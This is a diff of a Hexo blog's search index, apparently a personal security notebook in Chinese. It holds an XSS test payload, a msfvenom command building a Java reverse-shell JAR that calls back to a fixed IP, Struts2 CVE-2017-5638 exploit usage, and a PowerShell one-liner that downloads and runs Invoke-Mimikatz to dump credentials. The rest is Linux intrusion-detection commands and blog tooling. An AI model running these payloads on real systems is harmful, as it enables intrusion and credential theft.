@@ -1,456 +1,152 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-    
-    <entry>
-      <title><![CDATA[Xss常用测试代码]]></title>
-      <url>/2018/01/18/Xss%E5%B8%B8%E7%94%A8%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81/</url>
-      <content type="html"><![CDATA[<blockquote>
-<p>简单测试代码：</p>
-</blockquote>
-<pre><code>&lt;img src=&quot;#&quot; onerror=&quot;alert(111)&quot;&gt;
-</code></pre>]]></content>
-      
-        <categories>
-            
-            <category> 笔记 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> xss </tag>
-            
-            <tag> js </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[msf_shell]]></title>
-      <url>/2018/01/18/msf-shell/</url>
-      <content type="html"><![CDATA[<pre><code>java/meterpreter/reverse_tcp
-
-msfvenom -p java/meterpreter/reverse_tcp  LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar
-</code></pre>]]></content>
-      
-        <categories>
-            
-            <category> 笔记 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> msf </tag>
-            
-            <tag> shell </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[linux实用技巧]]></title>
-      <url>/2018/01/18/linux%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
-      <content type="html"><![CDATA[<p>编辑 .bashrc 文件：</p>
-<pre><code>root@kali:~# vim .bashrc 
-root@kali:~# source .bashrc
-</code></pre><h2 id="自定义终端命令启动程序"><a href="#自定义终端命令启动程序" class="headerlink" title="自定义终端命令启动程序"></a>自定义终端命令启动程序</h2><p>exm：</p>
-<pre><code>alias burp=&apos;setsid java -jar /root/softs/burpsuite_pro_v1.6.37.jar &gt;/dev/null 2&gt;&amp;1 &amp;&apos;
-</code></pre>]]></content>
-      
-        <categories>
-            
-            <category> 笔记 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> linux </tag>
-            
-            <tag> bash </tag>
-            
-            <tag> sh </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[linux入侵检测基础]]></title>
-      <url>/2018/01/18/linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80/</url>
-      <content type="html"><![CDATA[<h1 id="审计命令"><a href="#审计命令" class="headerlink" title="审计命令"></a>审计命令</h1><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><blockquote>
-<p>这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。</p>
-</blockquote>
-<pre><code>相关参数：
-
-last -10（-n） 查看最近10条记录
-last -x reboot 查看重启的记录
-last -x shutdown 查看关机的记录
-last -d 查看登陆的记录
-last –help 命令帮助信息
-last -f wtmp 用last命令查看wtmp文件（直接打开无法查看）
-</code></pre><a id="more"></a>
-<h2 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h2><blockquote>
-<p>这个命令用于查看登录失败的情况，本质就是将/var/log/btmp文件格式化输出。</p>
-</blockquote>
-<pre><code>相关参数：
-
-lastb name（root） 查看root用户登陆失败记录
-lastb -10（-n） 查看最近10条登陆失败记录
-lastb –heplp 命令帮助信息
-</code></pre><h2 id="lastlog"><a href="#lastlog" class="headerlink" title="lastlog"></a>lastlog</h2><blockquote>
-<p>这个命令用于查看用户上一次的登录情况，本质就是将/var/log/lastlog文件格式化输出。</p>
-</blockquote>
-<pre><code>相关参数：
-
-lastlog 所有用户上一次登陆记录
-lastlog -u username（root） root用户上一次登陆记录
-lastlog –help 命令帮助信息
-</code></pre><h2 id="who"><a href="#who" class="headerlink" title="who"></a>who</h2><blockquote>
-<p>这个命令用户查看当前登录系统的情况，本质就是将/var/log/utmp文件格式化输出。主要用来查看当前用户名称，以及登陆的ip地址信息，w命令与who一样，会更详细一些。</p>
-<h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p>查看历史命令记录，其实就是查看root/.bash_history文件内容，删除这个文件，记录就没了。</p>
-</blockquote>
-<pre><code>相关参数：
-
-history 查看所有历史记录
-history -10 查看最近10条记录
-history | grep “wget” 查看wget相关信息的记录
-history –help 命令帮助信息
-</code></pre><blockquote>
-<p>history显示时间戳：</p>
-</blockquote>
-<p><code>export HISTTIMEFORMAT=&quot;%F %T</code>whoami<code>&quot;
-history | more</code></p>
-<h1 id="检查用户"><a href="#检查用户" class="headerlink" title="检查用户"></a>检查用户</h1><blockquote>
-<p>Linux不同的用户，有不同的操作权限，但是所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录。</p>
-</blockquote>
-<pre><code>less /etc/passwd　　查看是否有新增用户
-grep :0 /etc/passwd　　查看是否有特权用户（root权限用户）
-ls -l /etc/passwd　　查看passwd最后修改时间
-</code></pre><p><code>cawk -F: &#39;$3==0 {print $1}&#39; /etc/passwd　　查看是否存在特权用户</code></p>
-<p><code>awk -F: &#39;length($2)==0 {print $1}&#39; /etc/shadow　　查看是否存在空口令用户</code></p>
-<blockquote>
-<p>注：linux设置空口令：<code>passwd -d username</code></p>
-</blockquote>
-<h1 id="检查进程"><a href="#检查进程" class="headerlink" title="检查进程"></a>检查进程</h1><blockquote>
-<p>一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。</p>
-</blockquote>
-<h2 id="普通进程"><a href="#普通进程" class="headerlink" title="普通进程"></a>普通进程</h2><pre><code>ps -aux　　查看进程
-top查看进程
-lsof -p pid　　查看进程所打开的端口及文件
-lsof -c 进程名　　查看关联文件
-ps -aux | grep python | cut -d &apos; &apos; -f 2 | xargs kill   杀死python相关的进程
-</code></pre><blockquote>
-<p>检查/etc/inetd.conf文件，输入：<code>cat /etc/inetd.conf | grep –v &quot;^#&quot;</code>，输出的信息就是你这台机器所开启的远程服务。</p>
-</blockquote>
-<h2 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h2><pre><code>ps -ef | awk &apos;{print}&apos; | sort -n | uniq &gt;1  
-ls /proc | sort -n |uniq &gt;2
-diff 1 2
-</code></pre><h1 id="检查文件"><a href="#检查文件" class="headerlink" title="检查文件"></a>检查文件</h1><blockquote>
-<p>被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。</p>
-</blockquote>
-<pre><code>find / -uid 0 -print　　查找特权用户文件
-find / -size +10000k -print　　查找大于10000k的文件
-find / -name &quot;…&quot; -prin　　查找用户名为…的文件
-find / -name core -exec ls -l {} \;　　查找core文件，并列出详细信息
-md5sum -b filename　　查看文件的md5值
-rpm -qf /bin/ls　　检查文件的完整性（还有其它/bin目录下的文件）
-whereis 文件名　　查看文件路径
-ls -al 文件名　　查看文件创建时间
-du -sh  文件名   查看文件大小
-</code></pre><h1 id="检查网络"><a href="#检查网络" class="headerlink" title="检查网络"></a>检查网络</h1><blockquote>
-<p>检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。</p>
-</blockquote>
-<pre><code>ip link | grep PROMISC　　正常网卡不应该存在promisc，如果存在可能有sniffer
-lsof -i
-netstat -nap　　查看不正常端口
-arp -a　　查看arp记录是否正常
-ifconfig -a　　查看网卡设置
-</code></pre><h1 id="检查计划任务"><a href="#检查计划任务" class="headerlink" title="检查计划任务"></a>检查计划任务</h1><blockquote>
-<p>当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。</p>
-</blockquote>
-<pre><code>crontab -u root -l　　查看root用户的计划任务
-cat /etc/crontab
-ls -l /etc/cron.*　　查看cron文件是否变化的详细信息
-ls /var/spool/cron/
-</code></pre><h1 id="检查系统后门"><a href="#检查系统后门" class="headerlink" title="检查系统后门"></a>检查系统后门</h1><blockquote>
-<p>可以使用工具，如：Conmodo、rkhunter等，当然也可以手工输入命令检查。</p>
-</blockquote>
-<pre><code>vim $HOME/.ssh/authorized_keys　　查看ssh永久链接文件
-lsmod　　检查内核模块
-chkconfig –list/systemctl list-units –type=service　　检查自启
-</code></pre><blockquote>
-<p>查看著名的木门后门程序：</p>
-</blockquote>
-<pre><code>ls /etc/rc.d   #系统开机后，此目录下的文件会被启动
-ls /etc/rc3.d
-find / -name “.rhosts” –print
-find / -name “.forward” –print
-</code></pre><h1 id="打包文件"><a href="#打包文件" class="headerlink" title="打包文件"></a>打包文件</h1><blockquote>
-<p>当我们做好一切入侵检测分析后，我们需要把一些日志文件copy到本地进行更进一步详细的分析时，怎么打包服务器相关信息，并且copy到本地呢？</p>
-</blockquote>
-<h2 id="打包web文件"><a href="#打包web文件" class="headerlink" title="打包web文件"></a>打包web文件</h2><p>打包文件名中包含jsp的文件，打包后的文件为my_txt_files.tar：<br>tar cvf my_txt_files.tar <code>find . -type f -name &quot;*.jsp*&quot;</code></p>
-<h2 id="打包日志文件"><a href="#打包日志文件" class="headerlink" title="打包日志文件"></a>打包日志文件</h2><pre><code>tar -cvf log.tar /var/log
-</code></pre><h2 id="打包其他信息"><a href="#打包其他信息" class="headerlink" title="打包其他信息"></a>打包其他信息</h2><pre><code>last &gt; last.log
-netstat -an &gt; netstat.log
-</code></pre>]]></content>
-      
-        <categories>
-            
-            <category> 笔记 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> linux </tag>
-            
-            <tag> 入侵检测，安全审计 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[kali安装NVIDIA显卡驱动]]></title>
-      <url>/2018/01/10/kali%E5%AE%89%E8%A3%85NVIDIA%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8/</url>
-      <content type="html"><![CDATA[<p>安装参考链接<br><a href="https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop" target="_blank" rel="noopener">https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop</a><br>验证：<br><a href="https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux" target="_blank" rel="noopener">https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux</a></p>
-]]></content>
-      
-        <categories>
-            
-            <category> 笔记 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> kali </tag>
-            
-            <tag> NVIDIA </tag>
-            
-            <tag> 驱动 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[s2-045 exp CVE-2017-5638]]></title>
-      <url>/2017/03/16/s2-045-exp-CVE-2017-5638/</url>
-      <content type="html"><![CDATA[<p>Usage:</p>
-<p>Testing a single URL.</p>
-<pre><code>python struts-pwn.py --url &apos;http://example.com/struts2-showcase/index.action&apos; -c &apos;id&apos;
-</code></pre><p>Testing a list of URLs.</p>
-<pre><code>python struts-pwn.py --list &apos;urls.txt&apos; -c &apos;id&apos;
-</code></pre><p>Checking if the vulnerability exists against a single URL.</p>
-<pre><code>python struts-pwn.py --check --url &apos;http://example.com/struts2-showcase/index.action&apos;
-</code></pre><p>Checking if the vulnerability exists against a list of URLs.</p>
-<pre><code>python struts-pwn.py --check --list &apos;urls.txt&apos;
-</code></pre><p>Requirements</p>
-<pre><code>Python2 or Python3
-requests
-</code></pre><p><a href="https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py" title="s2-045" target="_blank" rel="noopener">https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py</a></p>
-]]></content>
-      
-        <categories>
-            
-            <category> exploit </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> s2-045 </tag>
-            
-            <tag> exp </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Python command]]></title>
-      <url>/2017/03/06/Python-command/</url>
-      <content type="html"><![CDATA[<p>python:</p>
-<pre><code>py -2 hello.py
-
-py -3 hello.py
-</code></pre><p>pip</p>
-<pre><code>py -2 -m pip install XXXX
-
-py -3 -m pip install XXXX
-</code></pre>]]></content>
-      
-        <categories>
-            
-            <category> 笔记 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> python </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[SimpleHTTPServer]]></title>
-      <url>/2017/03/05/SimpleHTTPServer/</url>
-      <content type="html"><![CDATA[<pre><code>python -m SimpleHTTPServer 8080 #端口可自定义
-</code></pre>]]></content>
-      
-        <categories>
-            
-            <category> 笔记 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> command </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[win10-Cmd here]]></title>
-      <url>/2017/03/04/win10-Cmd-here/</url>
-      <content type="html"><![CDATA[<p>保存为reg格式导入注册表即可：</p>
-<pre><code>Windows Registry Editor Version 5.00
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here]
-@=&quot;Cmd Here&quot;
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here\command]
-@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt]
-@=&quot;Cmd Here&quot;
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt\command]
-@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot; \&quot;cd %1\&quot;&quot;
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here]
-@=&quot;Cmd Here&quot;
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here\command]
-@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;
-</code></pre><p><img src="http://i.imgur.com/wZijEcJ.jpg" alt=""></p>
-]]></content>
-      
-        <categories>
-            
-            <category> 笔记 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> cmd </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[hexo command]]></title>
-      <url>/2017/03/02/hexo-command/</url>
-      <content type="html"><![CDATA[<pre><code>hexo new &quot;postName&quot; #新建文章
-hexo new page &quot;pageName&quot; #新建页面
-hexo generate #生成静态页面至public目录
-hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）
-hexo deploy #将.deploy目录部署到GitHub
-</code></pre><hr>
-<pre><code>hexo clean
-hexo generate --deploy
-</code></pre><hr>
-<a id="more"></a>]]></content>
-      
-        <categories>
-            
-            <category> 笔记 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> hexo </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[mimikittenz-Ps1版]]></title>
-      <url>/2017/03/01/mimikittenz-Ps1%E7%89%88/</url>
-      <content type="html"><![CDATA[<p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</a>‘); Invoke-Mimikatz -DumpCreds”</p>
-]]></content>
-      
-        <categories>
-            
-            <category> 提权 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> mimikittenz </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[0o0-test]]></title>
-      <url>/2017/03/01/0o0-test/</url>
-      <content type="html"><![CDATA[<p>测试文章–test—0o0~！！！！！！</p>
-<p>hexo new “postName” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo generate #生成静态页面至public目录<br>hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy #将.deploy目录部署到GitHub</p>
-<p>hexo new [layout] <title><br>hexo new photo “My Gallery”<br>hexo new “Hello World” –lang tw</title></p>
-<p>title: 使用Hexo搭建个人博客<br>layout: post<br>date: 2014-03-03 19:07:43<br>comments: true<br>categories: Blog<br>tags: [Hexo]<br>keywords: Hexo, Blog<br>description: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。</p>
-]]></content>
-      
-        
-    </entry>
-    
-  
-  
-    
-    <entry>
-      <title></title>
-      <url>/categories/index.html</url>
-      <content type="html"></content>
-    </entry>
-    
-    <entry>
-      <title></title>
-      <url>/tags/index.html</url>
-      <content type="html"></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[0o0]]></title>
-      <url>/about/index.html</url>
-      <content type="html"><![CDATA[<center>&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;</center><br><center>我的地盘我做主！</center><br><center>弹指一挥间，世界皆互联!</center><br><center>&lt;&lt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&lt;&gt;&gt;&gt;&gt;&gt;</center>]]></content>
-    </entry>
-    
-  
+<search>
+  <entry>
+    <title><![CDATA[Xss常用测试代码]]></title>
+    <url>%2F2018%2F01%2F18%2FXss%E5%B8%B8%E7%94%A8%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81%2F</url>
+    <content type="text"><![CDATA[简单测试代码： &lt;img src=&quot;#&quot; onerror=&quot;alert(111)&quot;&gt;]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>xss</tag>
+        <tag>js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[msf_shell]]></title>
+    <url>%2F2018%2F01%2F18%2Fmsf-shell%2F</url>
+    <content type="text"><![CDATA[java/meterpreter/reverse_tcp msfvenom -p java/meterpreter/reverse_tcp LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>msf</tag>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[linux实用技巧]]></title>
+    <url>%2F2018%2F01%2F18%2Flinux%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
+    <content type="text"><![CDATA[编辑 .bashrc 文件： root@kali:~# vim .bashrc root@kali:~# source .bashrc 自定义终端命令启动程序exm： alias burp=&apos;setsid java -jar /root/softs/burpsuite_pro_v1.6.37.jar &gt;/dev/null 2&gt;&amp;1 &amp;&apos; echo &quot;###&quot; &gt; file 替换文件 echo &quot;###&quot; &gt;&gt; file 追加写入文件 echo alias ss=&apos;ss start&apos; &gt;&gt; .bashrc]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>bash</tag>
+        <tag>sh</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[linux入侵检测基础]]></title>
+    <url>%2F2018%2F01%2F18%2Flinux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80%2F</url>
+    <content type="text"><![CDATA[审计命令last 这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。 相关参数： last -10（-n） 查看最近10条记录 last -x reboot 查看重启的记录 last -x shutdown 查看关机的记录 last -d 查看登陆的记录 last –help 命令帮助信息 last -f wtmp 用last命令查看wtmp文件（直接打开无法查看） lastb 这个命令用于查看登录失败的情况，本质就是将/var/log/btmp文件格式化输出。 相关参数： lastb name（root） 查看root用户登陆失败记录 lastb -10（-n） 查看最近10条登陆失败记录 lastb –heplp 命令帮助信息 lastlog 这个命令用于查看用户上一次的登录情况，本质就是将/var/log/lastlog文件格式化输出。 相关参数： lastlog 所有用户上一次登陆记录 lastlog -u username（root） root用户上一次登陆记录 lastlog –help 命令帮助信息 who 这个命令用户查看当前登录系统的情况，本质就是将/var/log/utmp文件格式化输出。主要用来查看当前用户名称，以及登陆的ip地址信息，w命令与who一样，会更详细一些。 history查看历史命令记录，其实就是查看root/.bash_history文件内容，删除这个文件，记录就没了。 相关参数： history 查看所有历史记录 history -10 查看最近10条记录 history | grep “wget” 查看wget相关信息的记录 history –help 命令帮助信息 history显示时间戳： export HISTTIMEFORMAT=&quot;%F %Twhoami&quot; history | more 检查用户 Linux不同的用户，有不同的操作权限，但是所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录。 less /etc/passwd 查看是否有新增用户 grep :0 /etc/passwd 查看是否有特权用户（root权限用户） ls -l /etc/passwd 查看passwd最后修改时间 cawk -F: &#39;$3==0 {print $1}&#39; /etc/passwd 查看是否存在特权用户 awk -F: &#39;length($2)==0 {print $1}&#39; /etc/shadow 查看是否存在空口令用户 注：linux设置空口令：passwd -d username 检查进程 一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。 普通进程ps -aux 查看进程 top查看进程 lsof -p pid 查看进程所打开的端口及文件 lsof -c 进程名 查看关联文件 ps -aux | grep python | cut -d &apos; &apos; -f 2 | xargs kill 杀死python相关的进程 检查/etc/inetd.conf文件，输入：cat /etc/inetd.conf | grep –v &quot;^#&quot;，输出的信息就是你这台机器所开启的远程服务。 隐藏进程ps -ef | awk &apos;{print}&apos; | sort -n | uniq &gt;1 ls /proc | sort -n |uniq &gt;2 diff 1 2 检查文件 被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。 find / -uid 0 -print 查找特权用户文件 find / -size +10000k -print 查找大于10000k的文件 find / -name &quot;…&quot; -prin 查找用户名为…的文件 find / -name core -exec ls -l {} \; 查找core文件，并列出详细信息 md5sum -b filename 查看文件的md5值 rpm -qf /bin/ls 检查文件的完整性（还有其它/bin目录下的文件） whereis 文件名 查看文件路径 ls -al 文件名 查看文件创建时间 du -sh 文件名 查看文件大小 检查网络 检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。 ip link | grep PROMISC 正常网卡不应该存在promisc，如果存在可能有sniffer lsof -i netstat -nap 查看不正常端口 arp -a 查看arp记录是否正常 ifconfig -a 查看网卡设置 检查计划任务 当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。 crontab -u root -l 查看root用户的计划任务 cat /etc/crontab ls -l /etc/cron.* 查看cron文件是否变化的详细信息 ls /var/spool/cron/ 检查系统后门 可以使用工具，如：Conmodo、rkhunter等，当然也可以手工输入命令检查。 vim $HOME/.ssh/authorized_keys 查看ssh永久链接文件 lsmod 检查内核模块 chkconfig –list/systemctl list-units –type=service 检查自启 查看著名的木门后门程序： ls /etc/rc.d #系统开机后，此目录下的文件会被启动 ls /etc/rc3.d find / -name “.rhosts” –print find / -name “.forward” –print 打包文件 当我们做好一切入侵检测分析后，我们需要把一些日志文件copy到本地进行更进一步详细的分析时，怎么打包服务器相关信息，并且copy到本地呢？ 打包web文件打包文件名中包含jsp的文件，打包后的文件为my_txt_files.tar：tar cvf my_txt_files.tar find . -type f -name &quot;*.jsp*&quot; 打包日志文件tar -cvf log.tar /var/log 打包其他信息last &gt; last.log netstat -an &gt; netstat.log]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>入侵检测，安全审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[kali安装NVIDIA显卡驱动]]></title>
+    <url>%2F2018%2F01%2F10%2Fkali%E5%AE%89%E8%A3%85NVIDIA%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%2F</url>
+    <content type="text"><![CDATA[安装参考链接https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop验证：https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+        <tag>NVIDIA</tag>
+        <tag>驱动</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[s2-045 exp CVE-2017-5638]]></title>
+    <url>%2F2017%2F03%2F16%2Fs2-045-exp-CVE-2017-5638%2F</url>
+    <content type="text"><![CDATA[Usage: Testing a single URL. python struts-pwn.py --url &apos;http://example.com/struts2-showcase/index.action&apos; -c &apos;id&apos; Testing a list of URLs. python struts-pwn.py --list &apos;urls.txt&apos; -c &apos;id&apos; Checking if the vulnerability exists against a single URL. python struts-pwn.py --check --url &apos;http://example.com/struts2-showcase/index.action&apos; Checking if the vulnerability exists against a list of URLs. python struts-pwn.py --check --list &apos;urls.txt&apos; Requirements Python2 or Python3 requests https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py]]></content>
+      <categories>
+        <category>exploit</category>
+      </categories>
+      <tags>
+        <tag>s2-045</tag>
+        <tag>exp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Python command]]></title>
+    <url>%2F2017%2F03%2F06%2FPython-command%2F</url>
+    <content type="text"><![CDATA[python: py -2 hello.py py -3 hello.py pip py -2 -m pip install XXXX py -3 -m pip install XXXX]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SimpleHTTPServer]]></title>
+    <url>%2F2017%2F03%2F05%2FSimpleHTTPServer%2F</url>
+    <content type="text"><![CDATA[python -m SimpleHTTPServer 8080 #端口可自定义]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>command</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[win10-Cmd here]]></title>
+    <url>%2F2017%2F03%2F04%2Fwin10-Cmd-here%2F</url>
+    <content type="text"><![CDATA[保存为reg格式导入注册表即可： Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot; \&quot;cd %1\&quot;&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>cmd</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[hexo command]]></title>
+    <url>%2F2017%2F03%2F02%2Fhexo-command%2F</url>
+    <content type="text"><![CDATA[hexo new &quot;postName&quot; #新建文章 hexo new page &quot;pageName&quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） hexo deploy #将.deploy目录部署到GitHub hexo clean hexo generate --deploy]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[mimikittenz-Ps1版]]></title>
+    <url>%2F2017%2F03%2F01%2Fmimikittenz-Ps1%E7%89%88%2F</url>
+    <content type="text"><![CDATA[powershell “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1‘); Invoke-Mimikatz -DumpCreds”]]></content>
+      <categories>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>mimikittenz</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[0o0-test]]></title>
+    <url>%2F2017%2F03%2F01%2F0o0-test%2F</url>
+    <content type="text"><![CDATA[测试文章–test—0o0~！！！！！！ hexo new “postName” #新建文章hexo new page “pageName” #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）hexo deploy #将.deploy目录部署到GitHub hexo new [layout] hexo new photo “My Gallery”hexo new “Hello World” –lang tw title: 使用Hexo搭建个人博客layout: postdate: 2014-03-03 19:07:43comments: truecategories: Blogtags: [Hexo]keywords: Hexo, Blogdescription: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2Fcategories%2Findex.html</url>
+    <content type="text"></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2Ftags%2Findex.html</url>
+    <content type="text"></content>
+  </entry>
+  <entry>
+    <title><![CDATA[0o0]]></title>
+    <url>%2Fabout%2Findex.html</url>
